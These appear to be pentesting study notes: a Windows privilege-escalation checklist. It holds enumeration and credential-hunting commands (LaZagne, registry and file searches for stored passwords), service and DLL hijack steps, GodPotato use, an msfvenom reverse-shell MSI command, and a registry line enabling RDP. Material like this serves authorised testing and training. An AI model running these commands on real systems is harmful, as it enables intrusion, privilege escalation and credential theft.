#### Manual

- Get-Process
- Get-LocalUser
- Get-LocalGroup
- Get-LocalGroupMember adminteam
- systeminfo
- ipconfig /all

#### Powershell History

- Get-History
- (Get-PSReadlineOption).HistorySavePath

#### Interesting Microsoft Office and text files

- Get-ChildItem -Path C:\ -Include _.txt,_.pdf,_.xls,_.xlsx,_.doc,_.docx -File -Recurse -ErrorAction SilentlyContinue

#### Show hidden files

- gci -force C:\Windows\System32

#### KDBX file?

- Get-ChildItem -Path C:\ -Include \*.kdbx -File -Recurse -ErrorAction SilentlyContinue

#### Use windows-exploit-suggester.py

- ./windows-exploit-suggester.py --update
- run `systeminfo` command on the window host then make a txt file on kali for it
- ./windows-exploit-suggester.py -d 2024-11-05-mssb.xls -i systeminfo

#### Use PowerUp.ps1

- .\PowerUp.ps1
- Get-ModifiableServiceFile

#### Use PrivescCheck.ps1

#### Binaries Hijack with uncommon Services

- uncommon/odd services? -> Service Binary Hijack
  - Manual Enumeration
    - Get-CimInstance -ClassName Win32_Process | Sort Name | Select Name, CommandLine | Format-List
    - Get-CimInstance -ClassName win32*service | Select Name, StartMode | Where-Object {$*.Name -like 'auditTracker'}
    - check for user's permission on the service exe/path `icacls "C:\xampp\apache\bin\httpd.exe"`, we want F access
    - if we can replace the service executable with our then restart the service

#### Unquoted service path?

- numerate running services to see if we can start/stop them
  - Get-CimInstance -ClassName win32_service | Select Name,State,PathName
- can also run this to check for unquote services
  - wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
- check to see if u can stop/start the service
  - `Start-Service GammaService` or `Get-Service <Name>` & `Stop-Service GammaService` (Make sure to stop the service before file transfer)
- using `icacls "C:\"` to check to see if we can write to the directory indicating with _W_ or full access _F_

#### DLL hijack

- check for installed applications and see if anything odds if so check them out
  - Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
- look up the interesting installed application and see if it has any DLL vulnerabilies
- check if current user can write to the directory so we can place the malicious

#### Scheduled task?

- check for running scheduled tasks
  - schtasks /query /fo LIST /v
- if scheduled task is using an exe, use `icacls` to check if we have write permission

#### Using exploits

- check systeminfo for anything vulnerables
  - check _SeImpersonatePrivilege_ using `whoami /priv`
    1. use `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"` to check for .NET version and use GodPotato
    2. download nc64.exe as well

#### AlwaysInstallElevated?

- use msfvenom to create a .msi file as a reverse shell ![[Pasted image 20241105173221.png]]
- msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR tun0 IP> LPORT=445 -f msi -o shell.msi

---

- Check users and Groups
- Check network config
  - run `ipconfig` for any duo network interface
  - check open ports
- any weird/uncommon application install? Store Cred Check
  - use LaZagne.exe
  - check for stored credentials [Stored Credentials – Penetration Testing Lab](https://pentestlab.blog/2017/04/19/stored-credentials/)
  - findstr /si password _.txt
    findstr /si password _.xml
    findstr /si password *.ini
    C:\> dir /b /s unattend.xml
    C:\> dir /b /s web.config
    C:\> dir /b /s sysprep.inf
    C:\> dir /b /s sysprep.xml
    C:\> dir /b /s *pass\*
    C:\> dir /b /s vnc.ini
  - Check here, could also be in base64
    - C:\unattend.xml
      C:\Windows\Panther\Unattend.xml
      C:\Windows\Panther\Unattend\Unattend.xml
      C:\Windows\system32\sysprep.inf
      C:\Windows\system32\sysprep\sysprep.xml
  - IIS web server?
    - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
      C:\inetpub\wwwroot\web.config
  - Group Policy Preferences
    - Services\Services.xml
      ScheduledTasks\ScheduledTasks.xml
      Printers\Printers.xml
      Drives\Drives.xml
      DataSources\DataSources.xml
  - McAfee?
    - %AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml
  - VNC?
    - VNC Ultra
      - reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
  - Putty?
    - reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
    - reg query HKLM /f password /t REG_SZ /s
    - reg query HKCU /f password /t REG_SZ /s
  - Window AutoLogin?
    - reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
  - SNMP Parameters?
    - reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

#### Enable RDP

- reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
